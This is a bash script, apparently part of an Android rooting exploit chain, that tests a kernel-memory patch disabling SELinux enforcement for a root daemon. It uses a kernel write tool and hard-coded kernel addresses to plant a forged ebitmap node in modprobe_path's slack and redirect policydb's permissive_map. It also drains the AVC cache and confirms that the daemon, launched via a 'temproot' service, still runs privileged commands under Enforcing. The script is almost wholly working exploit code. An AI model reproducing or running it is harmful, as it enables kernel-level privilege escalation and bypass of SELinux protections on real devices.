#!/usr/bin/env bash
# Test hypothesis H1: the permissive_map patch is correct but stale avc nodes kept
# answering. Sequence: plant node -> point permissive_map at it -> set
# avc_cache_threshold=0 -> force MANY fresh lookups (one per SELinux type we can name,
# from tools/_typelist.txt) so the cache is actually drained -> flip enforcing ->
# try ops whose avc nodes existed before the patch.
#
# Evidence rule used here: the channel output may be swallowed exactly when the patch
# failed (socket writes are denied), so the durable witness is a FILE the daemon creates
# while enforcing -- we re-escalate afterwards (proven to work in ~4s) and read it.
set -u
SER=${1:-3e5a38a5}
T="$(cd "$(dirname "$0")" && pwd)"
ADB="adb -s $SER"
D=/data/local/tmp
MODPROBE=0xffffffc001635a30
NODE_OFF=0x48
PERM_HEAD=0xffffffc00189f4d0          # policydb(0x189f320)+0x1b0, offset confirmed from
                                      # the Image: add x0,x21,#0x1b0 ; bl ebitmap_get_bit
$ADB get-state >/dev/null 2>&1 || { echo "ABORT: device not on adb"; exit 2; }
E=$($ADB shell getenforce 2>/dev/null | tr -d '\r')
[ "$E" = "Permissive" ] || { echo "need Permissive first (am startservice .EscService); got $E"; exit 2; }
$ADB forward tcp:12345 tcp:12345 >/dev/null 2>&1
$ADB push "$T/_typelist.txt" $D/typelist.txt >/dev/null 2>&1 || { echo "ABORT: push typelist"; exit 2; }

run() { # run <command-line> <wait-seconds>
	{ printf '%s\n' "$1"; sleep "$2"; } | timeout $((30 + $2)) bash -c \
		'exec 3<>/dev/tcp/127.0.0.1/12345; cat >&3; cat <&3' 2>/dev/null | tr -d '\r'
}

echo "=== 0. clean the witness files"
run "rm -f $D/nd/m1 $D/nd/m2; mkdir -p $D/nd; touch $D/nd/f; chcon u:object_r:radio_data_file:s0 $D/nd 2>/dev/null; rm -rf $D/np; mkdir -p $D/np; chcon u:object_r:${NEG_LABEL:-radio_data_file}:s0 $D/np; touch $D/np/f; chmod 666 $D/np/f; chmod 777 $D/np; echo CLEANED" 6 | grep CLEANED

echo "=== 1. plant the node in modprobe_path's dead tail, point permissive_map at it"
# Layout is built with struct.pack, NOT by hand-concatenated hex: my previous hand-built
# payload was 56 bytes (maps[1..5] is 40 bytes, I wrote 32), so the startbit landed in
# maps[5] and startbit stayed 0 -- which silently meant "no type is permissive".
# node = { next(8) ; maps[6](48) ; startbit(4) } ; head = { node*(8) ; highbit(4) ; pad(4) }
eval "$(NODE_BASE=0xffffffc001635a78 HEAD_ADDR=0xffffffc00189f4d0 TYPE_BIT=${TYPE:-241} \
	BITS_ALL=${ALL:-0} python3 - <<'PY'
import os, struct
base = int(os.environ["NODE_BASE"], 16)
head = int(os.environ["HEAD_ADDR"], 16)
bit = int(os.environ["TYPE_BIT"])
allb = os.environ["BITS_ALL"] == "1"
startbit = 0 if allb else (bit // 64) * 64
maps = [0xFFFFFFFFFFFFFFFF] * 6 if allb else [0] * 6
if not allb:
    maps[(bit - startbit) // 64] |= 1 << ((bit - startbit) % 64)
node = struct.pack("<Q", 0) + b"".join(struct.pack("<Q", m) for m in maps) + struct.pack("<I", startbit)
assert len(node) == 60, len(node)
node += b"\0" * 4                      # pad to 64 so the whole record is one write
extra = b""
if allb:
    # one node only spans 384 bits; chain a second so "ALL" really means all ~600 types
    node = struct.pack("<Q", base + 64) + b"".join(struct.pack("<Q", m) for m in maps) + struct.pack("<I", 0) + b"\0" * 4
    n2 = struct.pack("<Q", 0) + b"".join(struct.pack("<Q", m) for m in maps) + struct.pack("<I", 384) + b"\0" * 4
    assert len(node) == 64 and len(n2) == 64
    extra = n2
headp = struct.pack("<Q", base)
headp += struct.pack("<I", 0xFFFFFFFF if allb else bit) + struct.pack("<I", 0)
assert len(headp) == 16
print("NODE_HEX=" + (node + extra).hex())
print("NODE_BYTES=%d" % (len(node) + len(extra)))
print("HEAD_HEX=" + headp.hex())
print("NODE_INFO=startbit=%d maps0=0x%016x len=%d head_len=%d" % (startbit, maps[0], len(node), len(headp)))
PY
)"
echo "  $NODE_INFO"
run "/data/local/tmp/clobber 14 kern 0xffffffc001635a78 hex:$NODE_HEX 4 0 | grep -c 'PRIMITIVE WORKS'" 8
run "/data/local/tmp/clobber 14 kern $PERM_HEAD hex:$HEAD_HEX 4 0 | grep -c 'PRIMITIVE WORKS'" 8

echo "=== 2. drain the avc cache: threshold 0 + one fresh lookup per type"
run "echo 0 > /sys/fs/selinux/avc/cache_threshold; N=0; for TY in \$(cat $D/typelist.txt); do chcon u:object_r:\$TY:s0 $D/nd/f 2>/dev/null && stat $D/nd/f >/dev/null 2>&1 && N=\$((N+1)); done; echo PURGED=\$N" 120 | grep -E "PURGED"

echo "=== 3. flip to Enforcing and try two ops (their avc nodes existed pre-patch)"
run "echo 1 > /sys/fs/selinux/enforce; echo \$\$ > $D/nd/m1; id -Z > $D/nd/m2 2>&1; echo SENT" 8 | grep -c SENT | sed 's/^/  channel still answering: /'

echo "=== 4. what the device says from outside"
$ADB shell 'getenforce' 2>&1 | tr -d '\r' | sed 's/^/  getenforce: /'
# Negative control for "only OUR domain is exempt" -- must use a key the SHELL domain has
# never touched, because avc answers from cached nodes and the purge below only churns OUR
# ssid. So each mode gets its own fresh label (pass NEG_LABEL=...), and the probe dir is
# mode 777 with a 777 file inside: DAC permits it, so any refusal can only be MAC.
NEG2=$($ADB shell "stat $D/np/f 2>&1" 2>&1 | tr -d '\r' | head -1)
case "$NEG2" in
  *denied*|*Permission*) echo "  shell(fresh label ${NEG_LABEL:-radio_data_file}): REFUSED => still confined";;
  *) echo "  shell(fresh label ${NEG_LABEL:-radio_data_file}): ALLOWED => exemption covers shell too";;
esac

echo "=== 5. restore permissive (the escalation itself works from Enforcing)"
timeout 30 $ADB shell am startservice -n com.xplay6.temproot/.EscService >/dev/null 2>&1
i=0; while [ $i -lt 25 ]; do sleep 4; i=$((i+1)); G=$($ADB shell getenforce 2>/dev/null | tr -d '\r'); [ "$G" = "Permissive" ] && break; done
echo "  after restore: $G (waited $((i*4))s)"

echo "=== 6. verdict from the witnesses written while enforcing"
$ADB shell "ls -l $D/nd/m1 $D/nd/m2 2>&1 | tail -2; echo ---; cat $D/nd/m2 2>&1 | head -1" 2>&1 | tr -d '\r'
echo "  m1 exists  => the daemon's file write worked under Enforcing => permissive domain is in effect"
echo "  m2 content => the context the daemon ran commands as; 'u:r:qti_init_shell' + file present = PASS"
